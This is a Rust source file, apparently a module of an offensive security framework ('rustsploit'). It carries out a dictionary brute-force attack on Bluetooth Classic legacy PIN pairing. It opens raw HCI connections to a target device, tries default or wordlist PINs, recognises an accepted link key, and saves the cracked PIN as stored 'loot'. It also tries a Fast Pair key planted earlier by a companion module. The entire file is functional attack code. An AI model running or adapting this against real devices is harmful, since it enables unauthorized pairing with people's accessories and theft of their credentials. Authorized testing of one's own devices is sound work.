//! Classic legacy PIN bruteforce (dictionary attack over pairing).
//!
//! If `wpair` previously planted a Fast Pair account key on the same BDADDR
//! the operator can set `setg pin_candidate <hex>` to test that key against
//! the Classic legacy PIN slot first — the planted key often reads through
//! unchanged when the controller's persistent key store is shared across
//! transports (CTKD-adjacent scenarios).

use anyhow::Result;

use crate::module::{ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "Classic Legacy PIN Bruteforce".to_string(),
        description: "Dictionary attack against Bluetooth Classic legacy pairing: opens an ACL \
                      link, answers each PIN_Code_Request with the next candidate from the \
                      wordlist (setg pin_wordlist=/path, default 4-6 digit PINs) and watches \
                      for Link_Key_Notification (accepted) vs Authentication_Failure. Devices \
                      that still use legacy pairing with weak PINs fall completely. If wpair \
                      previously planted a Fast Pair account key on this target, set \
                      `setg pin_candidate <hex>` to test it before going to dictionary. \
                      Requires Linux + root (raw HCI)."
            .to_string(),
        authors: vec!["rustsploit contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: ModuleRank::Great,
        default_port: None,
    }
}

/// Default PIN candidates: classic headsets and accessories ship these.
#[cfg(all(feature = "bluetooth", target_os = "linux"))]
const DEFAULT_PINS: &[&str] = &[
    "0000", "1111", "1234", "8888", "9999", "12345", "123456", "000000", "2580", "1122",
];

#[cfg(all(feature = "bluetooth", target_os = "linux"))]
pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    use std::time::Duration;

    use crate::bluetooth::hci::{self, HciSocket};
    use crate::module::{Finding, FindingKind};

    crate::bluetooth::warn_no_fanout_once("classic_pin");
    let mut outcome = ModuleOutcome::ok();

    let target = crate::bluetooth::resolve_target_mac(ctx).ok_or_else(|| {
        anyhow::anyhow!("no target — 'setg target_mac <MAC>' (run classic_scan first)")
    })?;
    let pins: Vec<String> = match crate::tenant::resolve()
        .global_options()
        .get("pin_wordlist")
        .await
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
    {
        Some(path) => tokio::task::spawn_blocking(move || -> Result<Vec<String>> {
            let raw = std::fs::read_to_string(&path)
                .map_err(|e| anyhow::anyhow!("reading wordlist {path}: {e}"))?;
            Ok(raw
                .lines()
                .map(str::trim)
                .filter(|l| !l.is_empty() && l.len() <= 16)
                .map(str::to_string)
                .collect())
        })
        .await
        .map_err(|e| anyhow::anyhow!("classic PIN wordlist loader: {e}"))??,
        None => DEFAULT_PINS.iter().map(|s| s.to_string()).collect(),
    };

    // If wpair planted an account key for this target on a previous run, the
    // operator can pre-seed it via `setg pin_candidate <hex>` to test it first.
    let mut pins = pins;
    if let Some(candidate) = crate::tenant::resolve()
        .global_options()
        .get("pin_candidate")
        .await
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .or_else(|| {
            crate::bluetooth::inventory::lookup_account_key(&target)
                .ok()
                .flatten()
        })
    {
        crate::mprintln!("[*] Pre-seeding pin_candidate ({candidate}) from inventory/options.");
        pins.insert(0, candidate);
    }

    let mut wire = crate::bluetooth::parse_mac(&target)?;
    wire.reverse();
    let mut sock = HciSocket::open(
        crate::bluetooth::adapter::adapter_index() as u16,
        hci::HCI_CHANNEL_RAW,
    )?;

    crate::mprintln!(
        "[*] Legacy pairing attack on {target} with {} candidate PINs.",
        pins.len()
    );
    let mut found: Option<String> = None;
    for (i, pin) in pins.iter().enumerate() {
        if ctx.is_cancelled() {
            crate::meprintln!("[!] cancelled at PIN {i}.");
            break;
        }
        crate::mprintln!("  [*] ({}/{}) trying PIN '{}'", i + 1, pins.len(), pin);
        let conn = match sock.create_connection(&wire, 0x0008) {
            Ok(c) => c,
            Err(e) => {
                crate::meprintln!("  [!] connect failed: {e:#} — retrying next PIN.");
                continue;
            }
        };
        if let Err(e) = sock.authentication_requested(conn.handle) {
            crate::meprintln!("  [!] auth request failed: {e:#}");
            if let Err(disc) = sock.disconnect(conn.handle) {
                tracing::debug!("disconnect after failed auth: {disc:#}");
            }
            continue;
        }

        // Drive the exchange until a link key (success) or auth failure.
        let deadline = std::time::Instant::now() + Duration::from_secs(15);
        let mut status: Option<u8> = None;
        let mut key_arrived = false;
        while status.is_none() && !key_arrived {
            let remaining = deadline
                .checked_duration_since(std::time::Instant::now())
                .ok_or_else(|| anyhow::anyhow!("pairing exchange timed out for PIN {pin}"))?;
            let ev = sock.read_event(remaining)?;
            if hci::HciSocket::is_pin_code_req(&ev, &wire) {
                sock.pin_code_reply(&wire, pin)?;
            } else if hci::HciSocket::is_io_cap_req(&ev, &wire) {
                // Legacy PIN path can still get an IO-cap req on dual stacks.
                sock.io_capability_reply(&wire, 0x02)?;
            } else if ev.code == 0x18 {
                let (addr, key, _kt) = HciSocket::parse_link_key_notification(&ev)?;
                if addr == wire {
                    crate::mprintln!(
                        "[+] Link key accepted: {} …",
                        &crate::bluetooth::hex(&key)[..16]
                    );
                    key_arrived = true;
                }
            } else if let Some(s) = HciSocket::is_auth_complete(&ev) {
                status = Some(s);
            }
        }

        if key_arrived {
            crate::mprintln!("[+] PIN FOUND: '{pin}' — {target} legacy pairing broken.");
            found = Some(pin.to_string());
            outcome.findings.push(Finding {
                target: target.clone(),
                kind: FindingKind::Credential,
                message: format!("classic legacy PIN: {pin} (mac={target})"),
                data: Some(serde_json::json!({"mac": target, "pin": pin})),
            });
            match crate::loot::store_loot(
                &target,
                "bluetooth_pin",
                "Bluetooth Classic legacy pairing PIN",
                pin.as_bytes(),
                "creds/bluetooth/classic_pin",
            )
            .await
            {
                Some(id) => crate::mprintln!("[*] PIN stored to loot ({id})."),
                None => crate::meprintln!("[!] Failed to persist PIN to loot."),
            }
        }
        if let Err(e) = sock.disconnect(conn.handle) {
            tracing::debug!("disconnect failed: {e:#}");
        }
        if found.is_some() {
            break;
        }
    }

    if found.is_none() {
        crate::mprintln!("[-] No PIN accepted — target uses SSP or a strong PIN.");
    }
    Ok(outcome)
}

#[cfg(not(all(feature = "bluetooth", target_os = "linux")))]
pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    tracing::trace!(
        "classic_pin unavailable without bluetooth feature on Linux (target {:?})",
        ctx.target
    );
    anyhow::bail!(
        "classic_pin requires the `bluetooth` feature on Linux with root/CAP_NET_RAW (raw HCI)."
    )
}

crate::register_native_module!(
    crate::module::Category::Creds,
    "bluetooth/classic_pin",
    native
);
